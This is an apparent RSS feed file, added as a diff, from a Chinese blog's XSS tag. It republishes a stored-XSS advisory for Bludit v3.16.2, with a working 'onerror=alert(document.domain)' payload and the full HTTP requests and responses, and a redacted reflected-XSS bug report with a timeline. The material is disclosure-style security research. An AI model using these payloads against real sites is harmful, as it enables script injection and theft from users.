@@ -1,0 +1,113 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>XSS漏洞 on 办公AI智能小助手</title>
+        <link>http://localhost:1313/tags/xss%E6%BC%8F%E6%B4%9E/</link>
+        <description>Recent content in XSS漏洞 on 办公AI智能小助手</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-cn</language>
+        <copyright>qife</copyright>
+        <lastBuildDate>Mon, 04 Aug 2025 14:01:23 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/xss%E6%BC%8F%E6%B4%9E/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Bludit v3.16.2存储型XSS漏洞分析：通过&#34;添加新内容&#34;功能实现攻击</title>
+        <link>http://localhost:1313/p/bludit-v3.16.2%E5%AD%98%E5%82%A8%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E9%80%9A%E8%BF%87%E6%B7%BB%E5%8A%A0%E6%96%B0%E5%86%85%E5%AE%B9%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0%E6%94%BB%E5%87%BB/</link>
+        <pubDate>Mon, 04 Aug 2025 14:01:23 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/bludit-v3.16.2%E5%AD%98%E5%82%A8%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E9%80%9A%E8%BF%87%E6%B7%BB%E5%8A%A0%E6%96%B0%E5%86%85%E5%AE%B9%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0%E6%94%BB%E5%87%BB/</guid>
+        <description>&lt;h1 id=&#34;漏洞标题bludit-v3162添加新内容功能存储型xss漏洞&#34;&gt;漏洞标题：Bludit v3.16.2&amp;quot;添加新内容&amp;quot;功能存储型XSS漏洞
+&lt;/h1&gt;&lt;h1 id=&#34;日期2025年7月&#34;&gt;日期：2025年7月
+&lt;/h1&gt;&lt;h1 id=&#34;漏洞作者andrey-stoykov&#34;&gt;漏洞作者：Andrey Stoykov
+&lt;/h1&gt;&lt;h1 id=&#34;版本3162&#34;&gt;版本：3.16.2
+&lt;/h1&gt;&lt;h1 id=&#34;测试环境debian-12&#34;&gt;测试环境：Debian 12
+&lt;/h1&gt;&lt;h1 id=&#34;博客httpsmsecureltdblogspotcom&#34;&gt;博客：https://msecureltd.blogspot.com/
+&lt;/h1&gt;&lt;p&gt;存储型XSS&amp;quot;添加新内容&amp;quot;功能漏洞#1：&lt;/p&gt;
+&lt;p&gt;复现步骤：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;使用管理员账户登录并访问&amp;quot;新建内容&amp;quot;&lt;/li&gt;
+&lt;li&gt;在&amp;quot;源代码&amp;quot;字段输入以下参数
+&amp;ldquo;&lt;iframe&gt;&lt;textarea&gt;&lt;/iframe&gt;&lt;img src=&#34;&#34; onerror=&#34;alert(document.domain)&#34;&gt;&amp;rdquo;&lt;/li&gt;
+&lt;li&gt;点击&amp;quot;预览&amp;quot;时XSS载荷将被触发&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;// 添加新内容的HTTP POST请求&lt;/p&gt;
+&lt;p&gt;POST /bludit/admin/new-content HTTP/1.1
+Host: 192.168.58.133
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0)
+Gecko/20100101 Firefox/140.0
+[&amp;hellip;]&lt;/p&gt;
+&lt;p&gt;tokenCSRF=03a860fcc567fed86f6cb57e5877a469ef27e2ac&amp;amp;uuid=b219c568827ee49d5b8be839d6ab1043&amp;amp;type=published&amp;amp;coverImage=&amp;amp;content=&lt;iframe&gt;&lt;textarea&gt;&lt;/iframe&gt;&amp;lt;img+src%3d&amp;quot;&amp;quot;+onerror%3d&amp;quot;alert(document.domain)&amp;quot;&amp;gt;&amp;amp;category=&amp;amp;description=&amp;amp;date=2025-06-04+15%3A15%3A17&amp;amp;typeSelector=published&amp;amp;position=3&amp;amp;tags=&amp;amp;template=&amp;amp;externalCoverImage=&amp;amp;slug=xss&amp;amp;noindex=0&amp;amp;nofollow=0&amp;amp;noarchive=0&amp;amp;title=xss&lt;/p&gt;
+&lt;p&gt;// HTTP响应&lt;/p&gt;
+&lt;p&gt;HTTP/1.1 301 Moved Permanently
+Date: Wed, 04 Jun 2025 19:16:04 GMT
+Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
+Perl/v5.16.3
+X-Powered-By: Bludit
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0,
+pre-check=0
+Pragma: no-cache
+Location: /bludit/admin/content
+Content-Length: 0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8&lt;/p&gt;
+&lt;p&gt;// 触发XSS的HTTP GET请求&lt;/p&gt;
+&lt;p&gt;GET /bludit/admin/edit-content/xss HTTP/1.1
+Host: 192.168.58.133
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0)
+Gecko/20100101 Firefox/140.0
+[&amp;hellip;]&lt;/p&gt;
+&lt;p&gt;// HTTP响应&lt;/p&gt;
+&lt;p&gt;HTTP/1.0 200 OK
+Date: Wed, 04 Jun 2025 19:16:06 GMT
+Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
+Perl/v5.16.3
+X-Powered-By: Bludit
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0,
+pre-check=0
+Pragma: no-cache
+Connection: close
+Content-Type: text/html; charset=UTF-8&lt;/p&gt;
+&lt;p&gt;[&amp;hellip;]&lt;/p&gt;
+&lt;!-- 编辑器 --&gt;
+&lt;textarea id=&#34;jseditor&#34; class=&#34;editable h-100&#34;
+style=&#34;&#34;&gt;&lt;iframe&gt;&lt;textarea&gt;&lt;/iframe&gt;&lt;img+src%3d&#34;&#34;+onerror%3d&#34;alert(document.domain)&#34;&gt;
+[...]</description>
+        </item>
+        <item>
+        <title>██████网站customerId参数反射型XSS漏洞技术分析</title>
+        <link>http://localhost:1313/p/%E7%BD%91%E7%AB%99customerid%E5%8F%82%E6%95%B0%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
+        <pubDate>Sun, 03 Aug 2025 22:31:29 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E7%BD%91%E7%AB%99customerid%E5%8F%82%E6%95%B0%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
+        <description>&lt;h1 id=&#34;网站customerid参数反射型xss漏洞&#34;&gt;██████网站customerId参数反射型XSS漏洞
+&lt;/h1&gt;&lt;h2 id=&#34;漏洞概述&#34;&gt;漏洞概述
+&lt;/h2&gt;&lt;p&gt;在██████网站发现一个反射型跨站脚本(XSS)漏洞，该漏洞位于customerId参数中。由于该参数在HTTP响应返回用户前未经过充分净化处理，当参数被恶意JavaScript代码操纵时，注入的脚本会在用户浏览器上下文中执行。&lt;/p&gt;
+&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
+&lt;/h2&gt;&lt;p&gt;漏洞利用的关键在于&lt;code&gt;oncontentvisibilityautostatechange&lt;/code&gt;事件属性未被应用程序正确过滤或编码。攻击者可以构造包含JavaScript payload的恶意URL，当受害者访问该URL时，payload将被执行。&lt;/p&gt;
+&lt;p&gt;经确认该漏洞在Chrome浏览器中可成功利用，但在Firefox中不可行，这表明可能存在浏览器特定的过滤器绕过机制。&lt;/p&gt;
+&lt;h2 id=&#34;漏洞验证&#34;&gt;漏洞验证
+&lt;/h2&gt;&lt;p&gt;测试人员通过构造特殊格式的customerId参数成功复现了该漏洞，证实攻击者能够：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;注入任意JavaScript代码&lt;/li&gt;
+&lt;li&gt;在受害者浏览器上下文执行&lt;/li&gt;
+&lt;li&gt;窃取用户敏感信息或执行其他恶意操作&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;时间线&#34;&gt;时间线
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;2025年5月5日：漏洞首次提交&lt;/li&gt;
+&lt;li&gt;2025年5月5日：漏洞等级从高危调整为中危(5.6分)&lt;/li&gt;
+&lt;li&gt;2025年6月-7月：经过多次复测验证&lt;/li&gt;
+&lt;li&gt;2025年7月1日：漏洞被标记为已修复&lt;/li&gt;
+&lt;li&gt;2025年7月28日：漏洞报告公开披露&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;漏洞分类&#34;&gt;漏洞分类
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;弱点类型：反射型跨站脚本(XSS)&lt;/li&gt;
+&lt;li&gt;CVE编号：暂无&lt;/li&gt;
+&lt;li&gt;严重等级：中危(5.6)&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
